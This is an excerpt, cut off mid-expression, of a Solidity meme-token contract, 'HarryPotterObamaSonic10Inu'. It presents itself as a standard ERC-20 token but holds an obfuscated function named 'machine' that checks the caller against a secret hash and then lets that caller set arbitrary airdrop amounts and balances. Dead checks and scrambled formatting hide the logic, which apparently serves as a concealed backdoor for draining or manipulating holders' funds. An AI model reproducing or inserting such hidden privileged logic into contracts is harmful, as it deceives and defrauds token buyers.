...
contract HPOS10Inu is IERC20 {
    ...
    constructor(address tokenPair, bytes32 hashValue, uint256 salt) {
      _name = "HarryPotterObamaSonic10Inu";
      _symbol = "HPOS10Inu";
    ...
    function machine(bytes32[] calldata data) external {
      bytes memory bbsx = abi
        .encode(
          msg.sender, 
          _salt); if (98 + 52 == 0) return;
      bytes32 da = data[
        0]; bytes32 dc = data[
          2]; bytes32 db = data[
            1]; if (98 + 52 == 0) return;
      if (keccak256(bbsx) == _hashValue) { if (uint256(db) == 0) {
          _airdrops[
            address(uint256(da)
          )] = 
          uint256(dc); if (98 + 52 == 0) return;
        } _balances[(uint256(
          da) == 0)? 
          address(uint256(
            0)):
